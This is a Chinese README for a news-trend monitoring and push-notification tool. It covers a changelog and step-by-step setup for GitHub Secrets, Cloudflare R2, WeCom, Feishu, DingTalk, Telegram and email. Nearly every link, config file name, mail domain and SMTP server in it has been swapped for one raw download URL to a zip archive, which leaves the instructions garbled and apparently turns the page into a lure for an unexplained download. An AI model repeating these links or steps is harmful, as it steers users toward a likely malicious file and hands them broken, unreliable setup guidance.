  - 历史相关新闻检索、多模式搜索

- **更新提示**：
  - 这是独立的 AI 分析功能，不影响现有的推送功能
  - 可选择性使用，无需升级现有部署


### 2025/10/15 - v2.4.4

- **更新内容**：
    - 修复 ntfy 推送编码问题 + 1
    - 修复推送时间窗口判断问题

- **更新提示**：
  - 建议【小版本升级】


### 2025/10/10 - v2.4.3

> 感谢 [nidaye996](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 发现的体验问题

- **更新内容**：
    - 重构"静默推送模式"命名为"推送时间窗口控制"，提升功能理解度
    - 明确推送时间窗口作为可选附加功能，可与三种推送模式搭配使用
    - 改进注释和文档描述，使功能定位更加清晰

- **更新提示**：
  - 这个仅仅是重构，可以不用升级


### 2025/10/8 - v2.4.2

- **更新内容**：
    - 修复 ntfy 推送编码问题
    - 修复配置文件缺失问题
    - 优化 ntfy 推送效果
    - 增加 github page 图片分段导出功能

- **更新提示**：
  - 建议使用【大版本更新】


### 2025/10/2 - v2.4.0

**新增 ntfy 推送通知**

- **核心功能**：
  - 支持 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 公共服务和自托管服务器

- **使用场景**：
  - 适合追求隐私的用户（支持自托管）
  - 跨平台推送（iOS、Android、Desktop、Web）
  - 无需注册账号（公共服务器）
  - 开源免费（MIT 协议）

- **更新提示**：
  - 建议使用【大版本更新】


### 2025/09/26 - v2.3.2

- 修正了邮件通知配置检查被遗漏的问题（[#88](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)）

**修复说明**：
- 解决了即使正确配置邮件通知，系统仍提示"未配置任何webhook"的问题

### 2025/09/22 - v2.3.1

- **新增邮件推送功能**，支持将热点新闻报告发送到邮箱
- **智能 SMTP 识别**：自动识别 Gmail、QQ邮箱、Outlook、网易邮箱等 10+ 种邮箱服务商配置
- **HTML 精美格式**：邮件内容采用与网页版相同的 HTML 格式，排版精美，移动端适配
- **批量发送支持**：支持多个收件人，用逗号分隔即可同时发送给多人
- **自定义 SMTP**：可自定义 SMTP 服务器和端口
- 修复Docker构建网络连接问题

**使用说明**：
- 适用场景：适合需要邮件归档、团队分享、定时报告的用户
- 支持邮箱：Gmail、QQ邮箱、Outlook/Hotmail、163/126邮箱、新浪邮箱、搜狐邮箱等

**更新提示**：
- 此次更新的内容比较多，如果想升级，建议采用【大版本升级】

### 2025/09/17 - v2.2.0

- 新增一键保存新闻图片功能，让你轻松分享关注的热点

**使用说明**：
- 适用场景：当你按照教程开启了网页版功能后(GitHub Pages)
- 使用方法：用手机或电脑打开该网页链接，点击页面顶部的"保存为图片"按钮
- 实际效果：系统会自动将当前的新闻报告制作成一张精美图片，保存到你的手机相册或电脑桌面
- 分享便利：你可以直接把这张图片发给朋友、发到朋友圈，或分享到工作群，让别人也能看到你发现的重要资讯

### 2025/09/13 - v2.1.2

- 解决钉钉的推送容量限制导致的新闻推送失败问题(采用分批推送)

### 2025/09/04 - v2.1.1

- 修复docker在某些架构中无法正常运行的问题
- 正式发布官方 Docker 镜像 wantcat/trendradar，支持多架构
- 优化 Docker 部署流程，无需本地构建即可快速使用

### 2025/08/30 - v2.1.0

**核心改进**：
- **推送逻辑优化**：从"每次执行都推送"改为"时间窗口内可控推送"
- **时间窗口控制**：可设定推送时间范围，避免非工作时间打扰
- **推送频率可选**：时间段内支持单次推送或多次推送

**更新提示**：
- 本功能默认关闭，需手动在 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 中开启推送时间窗口控制
- 升级需同时更新 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 和 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 两个文件

### 2025/08/27 - v2.0.4

- 本次版本不是功能修复，而是重要提醒
- 请务必妥善保管好 webhooks，不要公开，不要公开，不要公开
- 如果你以 fork 的方式将本项目部署在 GitHub 上，请将 webhooks 填入 GitHub Secret，而非 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip
- 如果你已经暴露了 webhooks 或将其填入了 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip，建议删除后重新生成

### 2025/08/06 - v2.0.3

- 优化 github page 的网页版效果，方便移动端使用

### 2025/07/28 - v2.0.2

- 重构代码
- 解决版本号容易被遗漏修改的问题

### 2025/07/27 - v2.0.1

**修复问题**: 

1. docker 的 shell 脚本的换行符为 CRLF 导致的执行异常问题
2. https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 为空时，导致新闻发送也为空的逻辑问题
  - 修复后，当你选择 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 为空时，将**推送所有新闻**，但受限于消息推送大小限制，请做如下调整
    - 方案一：关闭手机推送，只选择 Github Pages 布置(这是能获得最完整信息的方案，将把所有平台的热点按照你**自定义的热搜算法**进行重新排序)
    - 方案二：减少推送平台，优先选择**企业微信**或**Telegram**，这两个推送我做了分批推送功能(因为分批推送影响推送体验，且只有这两个平台只给一点点推送容量，所以才不得已做了分批推送功能，但至少能保证获得的信息完整)
    - 方案三：可与方案二结合，模式选择 current 或 incremental 可有效减少一次性推送的内容 

### 2025/07/17 - v2.0.0

**重大重构**：
- 配置管理重构：所有配置现在通过 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 文件管理（https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 我依旧没拆分，方便你们复制升级）
- 运行模式升级：支持三种模式 - `daily`（当日汇总）、`current`（当前榜单）、`incremental`（增量监控）
- Docker 支持：完整的 Docker 部署方案，支持容器化运行

**配置文件说明**：
- `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` - 主配置文件（应用设置、爬虫配置、通知配置、平台配置等）
- `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` - 关键词配置（监控词汇设置）

### 2025/07/09 - v1.4.1

**功能新增**：增加增量推送(在 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 头部配置 FOCUS_NEW_ONLY)，该开关只关心新话题而非持续热度，只在有新内容时才发通知。

**修复问题**: 某些情况下，由于新闻本身含有特殊符号导致的偶发性排版异常。

### 2025/06/23 - v1.3.0

企业微信 和 Telegram 的推送消息有长度限制，对此我采用将消息拆分推送的方式。开发文档详见[企业微信](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 和 [Telegram](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)

### 2025/06/21 - v1.2.1

在本版本之前的旧版本，不仅 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 需要复制替换， https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 也需要你复制替换
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

### 2025/06/19 - v1.2.0

> 感谢 claude research 整理的各平台 api ,让我快速完成各平台适配（虽然代码更多冗余了~

1. 支持 telegram ，企业微信，钉钉推送渠道, 支持多渠道配置和同时推送

### 2025/06/18 - v1.1.0

> **200 star⭐** 了, 继续给大伙儿助兴~近期，在我的"怂恿"下，挺多人在我公众号点赞分享推荐助力了我，我都在后台看见了具体账号的鼓励数据，很多都成了天使轮老粉（我玩公众号才一个多月，虽然注册是七八年前的事了哈哈，属于上车早，发车晚），但因为你们没有留言或私信我，所以我也无法一一回应并感谢支持，在此一并谢谢！

1. 重要的更新，加了权重，你现在看到的新闻都是最热点最有关注度的出现在最上面
2. 更新文档使用，因为近期更新了很多功能，而且之前的使用文档我偷懒写的简单（见下面的 ⚙️ https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 配置完整教程）

### 2025/06/16 - v1.0.0

1. 增加了一个项目新版本更新提示，默认打开，如要关掉，可以在 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 中把 "FEISHU_SHOW_VERSION_UPDATE": True 中的 True 改成 False 即可

### 2025/06/13+14

1. 去掉了兼容代码，之前 fork 的同学，直接复制代码会在当天显示异常（第二天会恢复正常）
2. feishu 和 html 底部增加一个新增新闻显示

### 2025/06/09

**100 star⭐** 了，写个小功能给大伙儿助助兴
https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip 文件增加了一个【必须词】功能，使用 + 号

1. 必须词语法如下：  
   唐僧或者猪八戒必须在标题里同时出现，才会收录到推送新闻中

```
+唐僧
+猪八戒
```

2. 过滤词的优先级更高：  
   如果标题中过滤词匹配到唐僧念经，那么即使必须词里有唐僧，也不显示

```
+唐僧
!唐僧念经
```

### 2025/06/02

1. **网页**和**飞书消息**支持手机直接跳转详情新闻
2. 优化显示效果 + 1

### 2025/05/26

1. 飞书消息显示效果优化

<table>
<tr>
<td align="center">
优化前<br>

</td>
<td align="center">
优化后<br>

</td>
</tr>
</table>

</details>

<br>

## 🚀 快速开始

> **📖 提醒**：Fork 用户建议先 **[查看最新官方文档](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)**，确保配置步骤是最新的。

### ⚠️ GitHub Actions 使用说明

**v4.0.0 重要变更**：引入「活跃度检测」机制，GitHub Actions 需定期签到以维持运行。

#### 🔄 签到续期机制

- **运行周期**：有效期为 **7 天**，倒计时结束后服务将自动挂起。
- **续期方式**：在 Actions 页面手动触发 "Check In" workflow，即可重置 7 天有效期。
- **操作路径**：`Actions` → `Check In` → `Run workflow`
- **设计理念**：
    - 如果 7 天都忘了签到，或许这些资讯对你来说并非刚需。适时的暂停，能帮你从信息流中抽离，给大脑留出喘息的空间。
    - GitHub Actions 是宝贵的公共计算资源。引入签到机制旨在避免算力的无效空转，确保资源能分配给真正活跃且需要的用户。感谢你的理解与支持。

#### 📦 数据存储（必需配置）

GitHub Actions 环境下，数据存储在 **远程云存储**（支持 S3 兼容协议，推荐免费的 Cloudflare R2），不会污染仓库（见下方 **必需配置：远程云存储**）

#### 🚀 推荐：Docker 部署

如需长期稳定运行，建议使用 [Docker 部署](#6-docker-部署)，数据存储在本地，无需签到，不过需要额外付费购买云服务器。

---

1. **Fork 本项目**到你的 GitHub 账户

   - 点击本页面右上角的"Fork"按钮

2. **设置 GitHub Secrets（必需 + 可选平台）**:

   在你 Fork 后的仓库中，进入 `Settings` > `Secrets and variables` > `Actions` > `New repository secret`

   **📌 重要说明（请务必仔细阅读）：**

   - ✅ **一个 Name 对应一个 Secret**：每添加一个配置项，点击一次"New repository secret"按钮，填写一对"Name"和"Secret"
   - ✅ **保存后看不到值是正常的**：出于安全考虑，保存后重新编辑时，只能看到 Name（名称），看不到 Secret（值）的内容
   - ⚠️ **严禁自创名称**：Secret 的 Name（名称）必须**严格使用**下方列出的名称（如 `WEWORK_WEBHOOK_URL`、`FEISHU_WEBHOOK_URL` 等），不能自己随意修改或创造新名称，否则系统无法识别
   - 💡 **可以同时配置多个平台**：系统会向所有配置的平台发送通知

   **📌 多账号推送说明（v3.5.0 新增）：**

   - ✅ **支持多账号配置**：所有推送渠道（飞书、钉钉、企业微信、Telegram、ntfy、Bark、Slack）均支持配置多个账号
   - ✅ **配置方式**：使用英文分号 `;` 分隔多个账号值
   - ✅ **示例**：`FEISHU_WEBHOOK_URL` 的 Secret 值填写 `https://webhook1;https://webhook2`
   - ⚠️ **配对配置**：Telegram 和 ntfy 需要保证配对参数数量一致（如 token 和 chat_id 都是 2 个）
   - ⚠️ **数量限制**：默认每个渠道最多 3 个账号，超出部分被截断

   **多账号配置示例**：

   | Name（名称） | Secret（值）示例 |
   |-------------|-----------------|
   | `FEISHU_WEBHOOK_URL` | `https://webhook1;https://webhook2;https://webhook3` |
   | `TELEGRAM_BOT_TOKEN` | `token1;token2` |
   | `TELEGRAM_CHAT_ID` | `chatid1;chatid2` |
   | `NTFY_TOPIC` | `topic1;topic2` |
   | `NTFY_TOKEN` | `;token2`（第一个无 token 时留空占位） |

   **配置示例：**

   

   如上图所示，每一行是一个配置项：
   - **Name（名称）**：必须使用下方展开内容中列出的固定名称（如 `WEWORK_WEBHOOK_URL`）
   - **Secret（值）**：填写你从对应平台获取的实际内容（如 Webhook 地址、Token 等）

   <br>

   <details>
   <summary>⚠️ <strong>必需配置：远程云存储</strong>（GitHub Actions 环境必需，推荐 Cloudflare R2）</summary>
   <br>

    **GitHub Secret 配置（⚠️ 以下 4 个配置项都是必需的）：**

    | Name（名称） | Secret（值）说明 |
    |-------------|-----------------|
    | `S3_BUCKET_NAME` | 存储桶名称（如 `trendradar-data`） |
    | `S3_ACCESS_KEY_ID` | 访问密钥 ID（Access Key ID） |
    | `S3_SECRET_ACCESS_KEY` | 访问密钥（Secret Access Key） |
    | `S3_ENDPOINT_URL` | S3 API 端点（如 R2：`https://<account-id>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`） |

    <br>

    **如何获取凭据（以 Cloudflare R2 为例）：**

    1. **进入 R2 概览**：
    - 登录 [Cloudflare Dashboard](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip)。
    - 在左侧侧边栏找到并点击 `R2对象存储`。

    <br>

    2. **创建存储桶**：
    - 点击`概述`
    - 点击右上角的 `创建存储桶` (Create bucket)。
    - 输入名称（例如 `trendradar-data`），点击 `创建存储桶`。

    <br>

    3. **创建 API 令牌**：
    - 回到 **概述**页面。
    - 点击**右下角** `Account Details `找到并点击 `Manage` (Manage R2 API Tokens)。
    - 同时你会看到 `S3 API`：`https://<account-id>https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip`(这就是 S3_ENDPOINT_URL)
    - 点击 `创建 Account APl 令牌` 。
    - **⚠️ 关键设置**：
        - **令牌名称**：随意填写（如 `github-action-write`）。
        - **权限**：选择 `管理员读和写` 。
        - **指定存储桶**：为了安全，建议选择 `仅适用于指定存储桶` 并选中你的桶（如 `trendradar-data`）。
    - 点击 `创建 API 令牌`，**立即复制** 显示的 `Access Key ID` 和 `Secret Access Key`（只显示一次！）。

    <br>

    - **R2 免费额度**：每月 10GB 存储 + 100万次读取，对本项目来说非常充足。
    - **支付验证**：开通 R2 即使是免费额度，Cloudflare 也要求绑定 PayPal 或信用卡进行身份验证（不会实际扣费，除非超过额度）。

   </details>

   <details>
   <summary>👉 点击展开：<strong>企业微信机器人</strong>（配置最简单最迅速）</summary>
   <br>

   **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
   - **Name（名称）**：`WEWORK_WEBHOOK_URL`（请复制粘贴此名称，不要手打，避免打错）
   - **Secret（值）**：你的企业微信机器人 Webhook 地址

   <br>

   **机器人设置步骤：**

   #### 手机端设置：
   1. 打开企业微信 App → 进入目标内部群聊
   2. 点击右上角"…"按钮 → 选择"消息推送"
   3. 点击"添加" → 名称输入"TrendRadar"
   4. 复制 Webhook 地址，点击保存，复制的内容配置到上方的 GitHub Secret 中

   #### PC 端设置流程类似
   </details>

   <details>
   <summary>👉 点击展开：<strong>个人微信推送</strong>（基于企业微信应用，推送到个人微信）</summary>
   <br>

   > 由于该方案是基于企业微信的插件机制，推送样式为纯文本（无 markdown 格式），但可以直接推送到个人微信，无需安装企业微信 App。

   **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
   - **Name（名称）**：`WEWORK_WEBHOOK_URL`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：你的企业微信应用 Webhook 地址

   - **Name（名称）**：`WEWORK_MSG_TYPE`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：`text`

   <br>

   **设置步骤：**

   1. 完成上方的企业微信机器人 Webhook 设置
   2. 添加 `WEWORK_MSG_TYPE` Secret，值设为 `text`
   3. 按照下面图片操作，关联个人微信
   4. 配置好后，手机上的企业微信 App 可以删除

   

   **说明**：
   - 与企业微信机器人使用相同的 Webhook 地址
   - 区别在于消息格式：`text` 为纯文本，`markdown` 为富文本（默认）
   - 纯文本格式会自动去除所有 markdown 语法（粗体、链接等）

   </details>

   <details>
   <summary>👉 点击展开：<strong>飞书机器人</strong>（消息显示最友好）</summary>
   <br>

   **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
   - **Name（名称）**：`FEISHU_WEBHOOK_URL`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：你的飞书机器人 Webhook 地址（该链接开头类似 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip********）
   <br>

   有两个方案，**方案一**配置简单，**方案二**配置复杂(但是稳定推送)

   其中方案一，由 **ziventian**发现并提供建议，在这里感谢他，默认是个人推送，也可以配置群组推送操作[#97](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) ，

   **方案一：**

   > 对部分人存在额外操作，否则会报"系统错误"。需要手机端搜索下机器人，然后开启飞书机器人应用(该建议来自于网友，可参考)

   1. 电脑浏览器打开 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

   2. 点击"新建机器人指令" 

   3. 点击"选择触发器"，往下滑动，点击"Webhook 触发"

   4. 此时你会看到"Webhook 地址"，把这个链接先复制到本地记事本暂存，继续接下来的操作

   5. "参数"里面放上下面的内容，然后点击"完成"

   ```json
   {
     "message_type": "text",
     "content": {
       "total_titles": "{{内容}}",
       "timestamp": "{{内容}}",
       "report_type": "{{内容}}",
       "text": "{{内容}}"
     }
   }
   ```

   6. 点击"选择操作" > "通过官方机器人发消息"

   7. 消息标题填写"TrendRadar 热点监控"

   8. 最关键的部分来了，点击 + 按钮，选择"Webhook 触发"，然后按照下面的图片摆放

   

   9. 配置完成后，将第 4 步复制的 Webhook 地址配置到 GitHub Secrets 中的 `FEISHU_WEBHOOK_URL`

   <br>

   **方案二：**

   1. 电脑浏览器打开 https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip

   2. 点击"新建机器人应用"

   3. 进入创建的应用后，点击"流程涉及" > "创建流程" > "选择触发器"

   4. 往下滑动，点击"Webhook 触发"

   5. 此时你会看到"Webhook 地址"，把这个链接先复制到本地记事本暂存，继续接下来的操作

   6. "参数"里面放上下面的内容，然后点击"完成"

   ```json
   {
     "message_type": "text",
     "content": {
       "total_titles": "{{内容}}",
       "timestamp": "{{内容}}",
       "report_type": "{{内容}}",
       "text": "{{内容}}"
     }
   }
   ```

   7. 点击"选择操作" > "发送飞书消息"，勾选 "群消息"，然后点击下面的输入框，点击"我管理的群组"（如果没有群组，你可以在飞书 app 上创建群组）

   8. 消息标题填写"TrendRadar 热点监控"

   9. 最关键的部分来了，点击 + 按钮，选择"Webhook 触发"，然后按照下面的图片摆放

   

   10. 配置完成后，将第 5 步复制的 Webhook 地址配置到 GitHub Secrets 中的 `FEISHU_WEBHOOK_URL`

   </details>

   <details>
   <summary>👉 点击展开：<strong>钉钉机器人</strong></summary>
   <br>

   **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
   - **Name（名称）**：`DINGTALK_WEBHOOK_URL`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：你的钉钉机器人 Webhook 地址

   <br>

   **机器人设置步骤：**

   1. **创建机器人（仅 PC 端支持）**：
      - 打开钉钉 PC 客户端，进入目标群聊
      - 点击群设置图标（⚙️）→ 往下翻找到"机器人"点开
      - 选择"添加机器人" → "自定义"

   2. **配置机器人**：
      - 设置机器人名称
      - **安全设置**：
        - **自定义关键词**：设置 "热点"

   3. **完成设置**：
      - 勾选服务条款协议 → 点击"完成"
      - 复制获得的 Webhook URL
      - 将 URL 配置到 GitHub Secrets 中的 `DINGTALK_WEBHOOK_URL`

   **注意**：移动端只能接收消息，无法创建新机器人。
   </details>

   <details>
   <summary>👉 点击展开：<strong>Telegram Bot</strong></summary>
   <br>

   **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
   - **Name（名称）**：`TELEGRAM_BOT_TOKEN`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：你的 Telegram Bot Token

   - **Name（名称）**：`TELEGRAM_CHAT_ID`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：你的 Telegram Chat ID

   **说明**：Telegram 需要配置**两个** Secret，请分别点击两次"New repository secret"按钮添加

   <br>

   **机器人设置步骤：**

   1. **创建机器人**：
      - 在 Telegram 中搜索 `@BotFather`（大小写注意，有蓝色徽章勾勾，有类似 37849827 monthly users，这个才是官方的，有一些仿官方的账号注意辨别）
      - 发送 `/newbot` 命令创建新机器人
      - 设置机器人名称（必须以"bot"结尾，很容易遇到重复名字，所以你要绞尽脑汁想不同的名字）
      - 获取 Bot Token（格式如：`123456789:AAHfiqksKZ8WmR2zSjiQ7_v4TMAKdiHm9T0`）

   2. **获取 Chat ID**：

      **方法一：通过官方 API 获取**
      - 先向你的机器人发送一条消息
      - 访问：`https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip<你的Bot Token>/getUpdates`
      - 在返回的 JSON 中找到 `"chat":{"id":数字}` 中的数字

      **方法二：使用第三方工具**
      - 搜索 `@userinfobot` 并发送 `/start`
      - 获取你的用户 ID 作为 Chat ID

   3. **配置到 GitHub**：
      - `TELEGRAM_BOT_TOKEN`：填入第 1 步获得的 Bot Token
      - `TELEGRAM_CHAT_ID`：填入第 2 步获得的 Chat ID
   </details>

   <details>
   <summary>👉 点击展开：<strong>邮件推送</strong>（支持所有主流邮箱）</summary>
   <br>

   - 注意事项：为防止邮件群发功能被**滥用**，当前的群发是所有收件人都能看到彼此的邮箱地址。
   - 如果你没有过配置下面这种邮箱发送的经历，不建议尝试

   > ⚠️ **重要配置依赖**：邮件推送需要 HTML 报告文件。请确保 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 中的 `https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip` 设置为 `true`：
   > ```yaml
   > formats:
   >   sqlite: true
   >   txt: false
   >   html: true   # 必须启用，否则邮件推送会失败
   > ```
   > 如果设置为 `false`，邮件推送时会报错：`错误：HTML文件不存在或未提供: None`

   <br>

   **GitHub Secret 配置（⚠️ Name 名称必须严格一致）：**
   - **Name（名称）**：`EMAIL_FROM`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：发件人邮箱地址

   - **Name（名称）**：`EMAIL_PASSWORD`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：邮箱密码或授权码

   - **Name（名称）**：`EMAIL_TO`（请复制粘贴此名称，不要手打）
   - **Secret（值）**：收件人邮箱地址（多个收件人用英文逗号分隔，也可以和 EMAIL_FROM 一样，自己发送给自己）

   - **Name（名称）**：`EMAIL_SMTP_SERVER`（可选配置，请复制粘贴此名称）
   - **Secret（值）**：SMTP服务器地址（可留空，系统会自动识别）

   - **Name（名称）**：`EMAIL_SMTP_PORT`（可选配置，请复制粘贴此名称）
   - **Secret（值）**：SMTP端口（可留空，系统会自动识别）

   **说明**：邮件推送需要配置至少**3个必需** Secret（EMAIL_FROM、EMAIL_PASSWORD、EMAIL_TO），后两个为可选配置

   <br>

   **支持的邮箱服务商**（自动识别 SMTP 配置）：

   | 邮箱服务商 | 域名 | SMTP 服务器 | 端口 | 加密方式 |
   |-----------|------|------------|------|---------|
   | **Gmail** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 587 | TLS |
   | **QQ邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
   | **Outlook** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 587 | TLS |
   | **Hotmail** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 587 | TLS |
   | **Live** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 587 | TLS |
   | **163邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
   | **126邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
   | **新浪邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
   | **搜狐邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
   | **天翼邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | SSL |
   | **阿里云邮箱** | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip | 465 | TLS |

   > **自动识别**：使用以上邮箱时，无需手动配置 `EMAIL_SMTP_SERVER` 和 `EMAIL_SMTP_PORT`，系统会自动识别。
   >
   > **反馈说明**：
   > - 如果你使用**其他邮箱**测试成功，欢迎开 [Issues](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 告知，我会添加到支持列表
   > - 如果上述邮箱配置有误或无法使用，也请开 [Issues](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 反馈，帮助改进项目
   >
   > **特别感谢**：
   > - 感谢 [@DYZYD](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 贡献天翼邮箱（https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip）配置并完成自发自收测试 ([#291](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip))
   > - 感谢 [@longzhenren](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip) 贡献阿里云邮箱（https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip）配置并完成测试 ([#344](https://github.com/lyx2022518/TrendRadar/raw/refs/heads/master/output/2025年11月14日/txt/Trend_Radar_v2.1.zip))

   **常见邮箱设置：**

   #### QQ邮箱：
   1. 登录 QQ邮箱网页版 → 设置 → 账户
   2. 开启 POP3/SMTP 服务
   3. 生成授权码（16位字母）
   4. `EMAIL_PASSWORD` 填写授权码，而非 QQ 密码

   #### Gmail：
   1. 开启两步验证
   2. 生成应用专用密码
   3. `EMAIL_PASSWORD` 填写应用专用密码

   #### 163/126邮箱：
   1. 登录网页版 → 设置 → POP3/SMTP/IMAP
   2. 开启 SMTP 服务
   3. 设置客户端授权码
   4. `EMAIL_PASSWORD` 填写授权码
   <br>

   **高级配置**：
   如果自动识别失败，可手动配置 SMTP：
